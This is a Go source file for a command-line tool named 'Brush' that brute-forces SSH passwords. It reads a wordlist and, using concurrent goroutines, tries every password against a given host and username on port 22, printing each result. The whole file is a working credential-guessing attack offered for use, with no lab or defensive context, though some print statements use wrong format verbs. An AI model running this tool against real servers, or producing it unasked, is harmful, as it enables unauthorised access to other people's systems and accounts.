package main

import (
	"golang.org/x/crypto/ssh"
	"fmt"
	"os"
	"bufio"
	"time"
)

/*
TODO:
Stop goroutines on correcet pass
Benchmarks?
If false, pop from list?
*/

const help = "Brush takes three arguments: target Host, User, and Path to word list"

type Target struct {
	host string
	user string
}

type Pass struct {
	ok bool
	pass string
}

// ReadList scans word list into slice.
func ReadList(path string) ([]string, error) {
	// Read File
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close() // remember to close
	var lines []string
	// start scanning
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// Connex attempts to login to ssh.
func Connex(pss string, target Target) (Pass){
	config := &ssh.ClientConfig{
		User: target.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pss),
		},
	}
	// Dial your ssh server.
	conn, err := ssh.Dial("tcp", target.host+":22", config)
	if err != nil {
		return Pass{false, pss}
	}
	conn.Close()
	return Pass{true, pss}
}

func main() {
	// Args: 1. host 2. user 3. wordlist
	args := os.Args[1:]
	if len(args) != 3 {
		fmt.Println(help)
		return
	}
	target := Target{args[0], args[1]}
	wordList := args[2]
	// Read Password list
	passList, err := ReadList(wordList)
	if err != nil {
		fmt.Printf("List unavailable: [%s]", err)
		return
	}
	fmt.Printf("Starting bruteforce on %s with %s passwords\n", target.host, len(passList))
	start := time.Now()
	// Check for valid Passwords
	passChan := make(chan Pass)
	for _, p := range passList {
		go func(password string) {
			result := Connex(password, target)
			passChan<-result
		}(p)
	}
	//Read the Channels
	for i := 0; i < len(passList); i++ {
		res := <-passChan
		fmt.Println(res)
	}
	fmt.Print("Operation complete, %i elapsed", time.Since(start))
}
